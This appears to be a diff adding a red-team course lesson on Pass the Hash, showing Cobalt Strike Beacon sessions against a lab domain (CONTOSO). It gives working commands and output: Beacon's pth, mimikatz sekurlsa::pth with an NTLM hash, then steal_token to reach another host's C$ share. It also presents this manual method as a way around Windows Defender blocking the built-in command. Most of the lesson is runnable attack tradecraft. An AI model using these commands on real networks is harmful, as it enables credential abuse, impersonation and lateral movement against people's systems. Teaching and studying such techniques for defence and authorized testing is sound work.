@@ -1,0 +1,99 @@
+Pass the Hash (often shortened to pth) is a technique [T1550.002] that allows an adversary to leverage an NTLM hash for user impersonation.  There are two flavours of pth that are often used interchangeably.
+
+
+The first is implemented in Linux-based tools, like Impacket, which uses raw NTLM authentication for protocols like SMB.  
+The second is implemented in Windows-based tools, like Mimikatz, which patches the hash directly into the credential cache of a logon session.  
+Both of these approaches have historically worked well because the adversary isn't required to recover the plaintext credentials through cracking, and NTLM was the default authentication protocol in Windows for a long time.
+
+However, Microsoft are doing their utmost to remove NTLM from Windows altogether.  
+Kerberos has already replaced NTLM as the default authentication protocol, so seeing NTLM authentication is becoming more and more anomalous; and NTLM authentication may be restricted in hardened environments.
+
+Beacon has a built-in pth command - the syntax is simply pth [DOMAIN\user] [hash].  
+This is a wrapper around sekurlsa::pth.  It will echo some random data into a named pipe, which Beacon will then impersonate to assume the identity of the passed credentials.
+
+\\\
+beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
+[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:"rsteel" /domain:"CONTOSO" /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:"%COMSPEC% /c echo 8d3f86487c1 > \\.\pipe\f08610" command
+
+user	: rsteel
+domain	: CONTOSO
+program	: C:\Windows\system32\cmd.exe /c echo 8d3f86487c1 > \\.\pipe\f08610
+impers.	: no
+NTLM	: fc525c9683e8fe067095ba2ddc971889
+  |  PID  2920
+  |  TID  3716
+  |  LSA Process is now R/W
+  |  LUID 0 ; 18729858 (00000000:011dcb82)
+  \_ msv1_0   - data copy @ 000001F7FB8EA9D0 : OK !
+  \_ kerberos - data copy @ 000001F7FB8FCD28
+   \_ des_cbc_md4       -> null             
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 000001F7FB8D77A8 (32) -> null
+\\\
+
+However, as we saw in the Defence Evasion chapter, this built-in technique will be prevented by Windows Defender.  
+An alternate approach is to have Mimikatz run a different process and steal its token manually.
+
+
+\\\
+beacon> ls \\lon-ws-1\c$
+[*] Tasked beacon to list files in \\lon-ws-1\c$
+[-] could not open \\lon-ws-1\c$\*: 5 - ERROR_ACCESS_DENIED
+
+beacon> mimikatz sekurlsa::pth /user:rsteel /domain:CONTOSO /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:%COMSPEC%
+[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:rsteel /domain:CONTOSO /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:%COMSPEC% command
+[+] [job 0] received output:
+user	: rsteel
+domain	: CONTOSO
+program	: C:\Windows\system32\cmd.exe
+impers.	: no
+NTLM	: fc525c9683e8fe067095ba2ddc971889
+  |  PID  1188
+  |  TID  7032
+  |  LSA Process is now R/W
+  |  LUID 0 ; 3527950 (00000000:0035d50e)
+  \_ msv1_0   - data copy @ 000001BC136FCC90 : OK !
+  \_ kerberos - data copy @ 000001BC136928E8
+   \_ des_cbc_md4       -> null             
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 000001BC130B9B88 (32) -> null
+
+beacon> steal_token 1188
+[*] Tasked beacon to steal token from PID 1188
+
+beacon> ls \\lon-ws-1\c$
+[*] Listing: \\lon-ws-1\c$\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     01/23/2025 15:44:52   $Recycle.Bin
+          dir     01/23/2025 13:57:51   $WinREAgent
+          dir     01/23/2025 13:47:37   Documents and Settings
+          dir     02/20/2025 11:03:21   KerbApp
+          dir     05/08/2021 09:20:24   PerfLogs
+          dir     04/11/2025 13:02:45   Program Files
+          dir     01/23/2025 15:46:18   Program Files (x86)
+          dir     02/19/2026 14:00:51   ProgramData
+          dir     01/23/2025 13:47:43   Recovery
+          dir     01/24/2025 14:14:06   System Volume Information
+          dir     01/24/2025 14:14:08   Users
+          dir     04/11/2025 11:56:09   Windows
+ 12kb     fil     02/19/2026 05:58:39   DumpStack.log.tmp
+ 1gb      fil     02/19/2026 05:58:39   pagefile.sys
+
+beacon> rev2self
+[*] Tasked beacon to revert token
+
+beacon> kill 1188
+[*] Tasked beacon to kill 1188
+\\\
